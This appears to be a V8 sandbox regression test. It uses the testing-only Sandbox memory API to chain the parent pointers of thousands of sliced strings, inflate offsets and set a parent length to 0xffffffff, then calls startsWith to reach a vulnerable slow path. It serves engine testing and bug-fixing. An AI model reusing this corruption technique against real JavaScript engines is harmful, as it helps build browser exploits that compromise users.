// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --expose-gc

const kSlicedStringType = Sandbox.getInstanceTypeIdFor("SLICED_ONE_BYTE_STRING_TYPE");
const kLengthOffset = Sandbox.getFieldOffset(kSlicedStringType, "length");
const kParentOffset = Sandbox.getFieldOffset(kSlicedStringType, "parent");
const kOffsetOffset = Sandbox.getFieldOffset(kSlicedStringType, "offset");

let parent = "A".repeat(100);
let slices = [];
for (let i = 0; i < 3000; i++) {
  slices.push(parent.substring(1, 50));
}
if (Sandbox.getInstanceTypeOf(slices[0]) !== "SLICED_ONE_BYTE_STRING_TYPE") {
  throw new Error("Expected SLICED_ONE_BYTE_STRING_TYPE");
}
for (let i = 0; i < 5; i++) gc();

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

for (let i = 0; i < 2999; i++) {
  let addr_i = Sandbox.getAddressOf(slices[i]);
  let addr_next = Sandbox.getAddressOf(slices[i+1]);
  memory.setUint32(addr_i + kParentOffset, addr_next | 1, true);
  memory.setUint32(addr_i + kOffsetOffset, 0x60000000, true); // +0x30000000 Smi
}

// Now get the actual parent string of slices[2999] and corrupt its length
let actual_parent_addr = memory.getUint32(Sandbox.getAddressOf(slices[2999]) + kParentOffset, true) & ~1;
memory.setUint32(actual_parent_addr + kLengthOffset, 0xffffffff, true);

// Trigger startsWith (hits slow path StringToSlice)
slices[0].startsWith("A");
